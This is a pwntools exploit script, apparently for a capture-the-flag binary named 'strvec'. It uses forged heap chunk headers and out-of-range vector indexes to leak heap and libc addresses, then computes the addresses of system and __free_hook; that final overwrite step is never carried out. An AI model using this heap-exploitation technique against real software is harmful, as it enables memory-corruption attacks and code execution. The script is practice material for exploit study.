from pwn import *

r = process("./strvec")
gdb.attach(r)


r.recvuntil(b'Name:')
r.sendline(b"ngkhbao")

freehook_off = 0x1eeb28



def vecget(idx):
	r.sendline(b'1')
	r.recvuntil(b'idx =')
	r.sendline(str(idx))
	return r.recvuntil(b'2. set\n> ')

def vecset(idx, data):
	r.sendline(b'2')
	r.recvuntil(b'idx = ')
	r.sendline(str(idx))
	r.recvuntil(b'data =')
	r.send(data)
	r.recvuntil(b'2. set\n> ')

print(r.recvuntil(b'n ='))
max_size = 0x7fffffff
r.sendline(str(max_size))

payload = p64(0) + p64(0x31) + b'\n'
vecset(3, payload)



stuff = vecget(3).split(b'\n')[0][-6:]
stuff = int.from_bytes(stuff, "little")
heap_base = stuff - 0x2c0
print(hex(heap_base))

target = heap_base + 0x300
payload = p64(0) + p64(0x511) + b"\n"
vecset(998, payload)

payload = p64(target) + p64(target) + b'\n'
vecset(999, payload)

for i in range(0x20-7):
	vecset(1000+i, "\n")

payload = p64(0) + p64(0x21) + b"\n"
vecset(1100, payload)

vecset(15, "\n")

stuff = vecget(16).split(b'\n')[0][-6:]
stuff = int.from_bytes(stuff, "little")
libc_base = stuff - (0x1ebb70 + 0x10 + 96) 
print(hex(libc_base))

system = libc_base + 0x55410
free_hook = libc_base + 0x1eeb28

r.sendline("3")

r.interactive()